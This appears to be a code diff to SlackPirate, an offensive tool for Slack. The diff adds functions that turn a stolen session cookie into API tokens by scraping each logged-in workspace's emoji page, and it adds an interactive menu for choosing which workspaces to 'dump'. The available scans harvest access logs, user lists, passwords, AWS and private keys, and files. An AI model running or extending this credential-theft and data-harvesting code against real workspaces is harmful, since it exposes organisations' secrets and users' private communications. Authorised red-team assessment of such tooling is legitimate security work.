@@ -80,6 +80,8 @@ LINKS_QUERIES = ["amazonaws",
 ALREADY_SIGNED_IN_TEAM_REGEX = r"(https://[a-zA-Z0-9\-]+\.slack\.com)"
 # https://regex101.com/r/2Hz8AX/2
 SLACK_API_TOKEN_REGEX = r"\"api_token\":\"(xox[a-zA-Z]-[a-zA-Z0-9-]+)\""
+# https://regex101.com/r/mlYoy3/1
+SLACK_API_TOKEN_REGEX2 = r"xox[a-zA-Z](-[a-zA-Z0-9-]+)+"
 # https://regex101.com/r/cSZW0G/1
 WORKSPACE_VALID_EMAILS_REGEX = r"email-domains-formatted=\"(@.+?)[\"]"
 # https://regex101.com/r/jWrF8F/2
@@ -158,6 +160,32 @@ def sleep_if_rate_limited(slack_api_json_response):
         return False
 
 
+def list_cookie_tokens(cookie, user_agent):
+    """
+    If the --cookie flag is set then the tool connects to a Slack Workspace that you won't be a member of then RegEx
+    out the Workspaces you're logged in to. It will then connect to each one of those Workspaces then RegEx out the
+    api_token and return them.
+    """
+    workspaces = []
+    try:
+        cookie['d'] = urllib.parse.quote(urllib.parse.unquote(cookie['d']))
+        r = requests.get("https://slackpirate-donotuse.slack.com", cookies=cookie)
+        already_signed_in_match = set(re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content)))
+        if already_signed_in_match:
+            for workspace in already_signed_in_match:
+                r = requests.get(workspace + "/customize/emoji", cookies=cookie)
+                regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
+                for slack_token in regex_tokens:
+                    collected_scan_context = init_scanning_context(token=slack_token, user_agent=user_agent)
+                    admin = check_if_admin_token(token=slack_token, scan_context=collected_scan_context)
+                    workspaces.append((workspace, slack_token, admin))
+    except requests.exceptions.RequestException as exception:
+        workspaces = None  # differentiate between no workspaces found and an exception occurring
+        print(termcolor.colored(exception, "red"))
+    
+    return workspaces
+
+
 def display_cookie_tokens(cookie, user_agent):
     """
     If the --cookie flag is set then the tool connect to a Slack Workspace that you won't be a member of (like mine)
@@ -167,26 +195,17 @@ def display_cookie_tokens(cookie, user_agent):
     tokens to long-term storage especially as they are valid pretty much forever. I'll leave as is for now...
     """
 
-    try:
-        cookie['d'] = urllib.parse.quote(urllib.parse.unquote(cookie['d']))
-        r = requests.get("https://slackpirate-donotuse.slack.com", cookies=cookie)
-        already_signed_in_match = set(re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content)))
-        if already_signed_in_match:
-            print(termcolor.colored("This cookie has access to the following Workspaces: \n", "blue"))
-            for workspace in already_signed_in_match:
-                r = requests.get(workspace + "/customize/emoji", cookies=cookie)
-                regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
-                for slack_token in regex_tokens:
-                    collected_scan_context = init_scanning_context(token=slack_token, user_agent=user_agent)
-                    if check_if_admin_token(token=slack_token, scan_context=collected_scan_context):
-                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (admin token!)', "magenta"))
-                    else:
-                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (not admin)', "green"))
-        else:
-            print(termcolor.colored("No workspaces were found for this cookie", "red"))
-            exit()
-    except requests.exceptions.RequestException as exception:
-        print(termcolor.colored(exception, "red"))
+    workspaces = list_cookie_tokens(cookie, user_agent)
+    if workspaces:
+        print(termcolor.colored("This cookie has access to the following Workspaces: \n", "blue"))
+        for workspace, slack_token, admin in workspaces:
+            if admin:
+                print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (admin token!)', "magenta"))
+            else:
+                print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (not admin)', "green"))
+    else:
+        print(termcolor.colored("No workspaces were found for this cookie", "red"))
+
     exit()
 
 
@@ -773,6 +792,152 @@ def file_cleanup(input_file, scan_context: ScanningContext):
         return
 
 
+def _choose_tokens(cookie, user_agent):
+    """
+    Find the list of workspaces for which a cookie has access and list them to use user to choose from. Used by the
+    interactive command line and return the users list of choices.
+    """
+
+    tokens = list_cookie_tokens(dict(d=cookie), user_agent)
+    if tokens:
+        print(termcolor.colored("This cookie has access to the following workspaces:", "blue"))
+        for i, (workspace, _, admin) in enumerate(tokens):
+            if admin:
+                print(termcolor.colored(f"[{i}] {workspace} (admin!)", "magenta"))
+            else:
+                print(termcolor.colored(f"[{i}] {workspace} (not admin)", "green"))
+    else:
+        print(termcolor.colored("No workspaces were found for this cookie", "red"))
+        return None
+
+    tokens = {str(k): v for k, v in enumerate(tokens)}
+
+    selection_list = input("Select which workspace(s) to dump (number(s) as comma separated list): ").strip()
+
+    selected_tokens = []
+    if selection_list:
+        selected = [s.strip() for s in selection_list.split(",")]
+        for s in selected:
+            if s in tokens:
+                selected_tokens.append(tokens[s][1])
+            else:
+                print(termcolor.colored(f"Invalid workspace choice: '{s}'", "red"))
+                return None
+        print()
+    else:
+        print(termcolor.colored("No tokens selected", "red"))
+
+    return selected_tokens
+
+
+def _choose_scans():
+    """
+    Lists the possible scanning options to the user and allows them to choose which should be run. Used by the
+    interactive command line and returns the list of chosen scans.
+    """
+
+    # Possible scans to run along with their names
+    scan_options = {
+        "A": ("All",
+              [dump_team_access_logs, dump_user_list, find_s3, find_credentials, find_aws_keys, find_private_keys,
+               find_pinned_messages, find_interesting_links, download_interesting_files]),
+        "0": ('Dump team access logs in .json format if the token provided is a privileged token', [dump_team_access_logs]),
+        "1": ('Dump the user list in .json format', [dump_user_list]),
+        "2": ('Find references to S3 buckets', [find_s3]),
+        "3": ('Find references to passwords and other credentials', [find_credentials]),
+        "4": ('Find references to AWS keys', [find_aws_keys]),
+        "5": ('Find references to private keys', [find_private_keys]),
+        "6": ('Find references to pinned messages across all Slack channels', [find_pinned_messages]),
+        "7": ('Find references to interesting URLs and links', [find_interesting_links]),
+        "8": ('Download files based on pre-defined keywords', [download_interesting_files]),
+    }
+
+    # Print options to terminal
+    print(termcolor.colored("The following scanning options are available:", "blue"))
+    for key, (name, _) in scan_options.items():
+        print(termcolor.colored(f"[{key}] {name}", "blue"))
+
+    # Select scanning options
+    selection_list = input("Input ('A' or number(s) as comma separated list): ").strip()
+
+    if not selection_list:
+        print(termcolor.colored("No scanning option selected", "red"))
+        return []
+
+    selection_list = selection_list.split(",")
+    selection_list = [s.strip() for s in selection_list]
+
+    if "A" in selection_list and len(selection_list) > 1:
+        print(termcolor.colored("Cannot provide 'A' with other options", "red"))
+        return None
+
+    selected_scans = []
+    for s in selection_list:
+        if s in scan_options.keys():
+            selected_scans.extend(scan_options[s][1])
+        else:
+            print(termcolor.colored(f"Invalid scan option provided: '{s}'", "red"))
+            return None
+
+    return selected_scans
+
+
+def _interactive_command_line(args, user_agent):
+    """
+    Runs the interactive command line interface.
+    """
+
+    # Check no flags provided (if you want to use flags don't use interactive mode)
+    args_as_dict = vars(args).copy()
+    del args_as_dict['cookie']
+    del args_as_dict['token']
+    del args_as_dict['verbose']
+    del args_as_dict['interactive']
+
+    no_flags_specified = all(value is None for value in args_as_dict.values())
+
+    if not no_flags_specified:
+        print(termcolor.colored("You cannot use scan flags in interactive mode", "red"))
+        return
+
+    # Get cookie and token inputs
+    if args.cookie and args.token:
+        print(termcolor.colored("You cannot use both --cookie and --token flags at the same time", "red"))
+        return
+    elif args.cookie:  # Providing a cookie leads to a shorter execution path
+        provided_tokens = _choose_tokens(args.cookie, user_agent)
+    elif args.token:
+        provided_tokens = [args.token]
+    else:
+        cookie_or_token = input("Give me a cookie or token: ").strip()
+        if re.fullmatch(SLACK_API_TOKEN_REGEX2, cookie_or_token):
+            provided_tokens = [cookie_or_token]
+        else:
+            provided_tokens = _choose_tokens(cookie_or_token, user_agent)
+
+    if not provided_tokens:
+        return
+
+    selected_scans = _choose_scans()
+
+    if not selected_scans:
+        return
+
+    global verbose
+    verbose = args.verbose
+
+    for provided_token in provided_tokens:
+        collected_scan_context = init_scanning_context(token=provided_token, user_agent=selected_agent)
+
+        print(termcolor.colored(f"START: scanning {collected_scan_context.slack_workspace}..."))
+
+        pathlib.Path(collected_scan_context.output_directory).mkdir(parents=True, exist_ok=True)
+        print_interesting_information(scan_context=collected_scan_context)
+
+        for scan in selected_scans:
+            scan(token=provided_token, scan_context=collected_scan_context)
+
+
 if __name__ == '__main__':
     # Initialise the colorama module - this is used to print colourful messages - life's too dull otherwise
     colorama.init()
@@ -787,6 +952,8 @@ if __name__ == '__main__':
                         help='Slack Workspace token. The token should start with XOX.')
     parser.add_argument('-v', '--verbose', action="store_true",
                         help='Turn on verbosity for the output files')
+    parser.add_argument('--interactive', dest='interactive', action='store_true',
+                        help='enables the interactive command line for usability')
     parser.add_argument('--team-access-logs', dest='team_access_logs', action='store_true',
                         help='enable retrieval of team access logs')
     parser.add_argument('--no-team-access-logs', dest='team_access_logs', action='store_false',
@@ -836,6 +1003,10 @@ if __name__ == '__main__':
 
     selected_agent = get_user_agent()
 
+    if args.interactive:
+        _interactive_command_line(args, selected_agent)
+        exit()
+
     if args.cookie is None and args.token is None:  # Must provide one or the other
         print(termcolor.colored("No arguments passed. Run SlackPirate.py --help ", "red"))
         exit()
@@ -876,6 +1047,7 @@ if __name__ == '__main__':
     del args_as_dict['cookie']
     del args_as_dict['token']
     del args_as_dict['verbose']
+    del args_as_dict['interactive']
 
     # no flags were specified - we run all scans
     no_flags_specified = all(value == None for value in args_as_dict.values())
